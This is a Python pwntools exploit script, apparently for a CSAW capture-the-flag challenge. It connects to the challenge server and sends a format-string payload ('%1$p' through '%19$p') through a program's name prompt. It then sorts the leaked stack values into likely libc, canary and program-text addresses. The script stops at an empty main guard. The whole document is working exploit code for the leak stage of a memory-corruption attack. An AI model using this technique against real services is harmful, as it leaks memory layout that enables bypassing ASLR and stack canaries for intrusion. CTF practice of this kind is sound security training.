from pwn import *

def interact_with_program(r):
    # Handle first bard
    r.recvuntil(b'evil):')
    r.sendline(b'g')
    r.recvuntil(b'2)')
    r.sendline(b'1')
    r.recvuntil(b'name:')

    # Create format string payload
    format_string = 'AAAA.' + '.'.join(f'%{i}$p' for i in range(1, 20))
    r.sendline(format_string.encode())

    # Get output until next prompt or EOF
    try:
        output = r.recvuntil(b'evil):', timeout=2)
        return output
    except:
        return r.recv(timeout=2)

def analyze_leaks(output):
    if not output:
        return

    try:
        # Split by our delimiter
        parts = output.split(b'.')

        # First part should contain our AAAA marker
        if b'AAAA' not in parts[0]:
            log.warning("Marker not found in output")
            return

        # Analyze each leaked address
        for i, part in enumerate(parts[1:], 1):
            try:
                if b'nil' in part or b'(nil)' in part:
                    continue

                # Clean up the value and convert to int
                addr = int(part.strip(), 16)

                # Classify the address
                if addr > 0x7f0000000000:
                    log.success(f"Possible libc address at offset {i}: {hex(addr)}")
                elif addr & 0xfff == 0:
                    log.success(f"Possible canary/aligned address at offset {i}: {hex(addr)}")
                elif 0x400000 <= addr <= 0x500000:
                    log.success(f"Possible program text address at offset {i}: {hex(addr)}")

            except ValueError:
                continue
    except Exception as e:
        log.error(f"Error analyzing output: {str(e)}")

def main():
    # Set up connection
    try:
        r = remote('pwn.chal.csaw.io', 8000)

        # Get initial leaks
        log.info("Sending format string payload...")
        output = interact_with_program(r)

        # Print raw output for debugging
        log.info("Raw output:")
        print(output)

        # Analyze leaks
        log.info("Analyzing leaks...")
        analyze_leaks(output)

        r.close()

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")

if __name__ == '__main__':
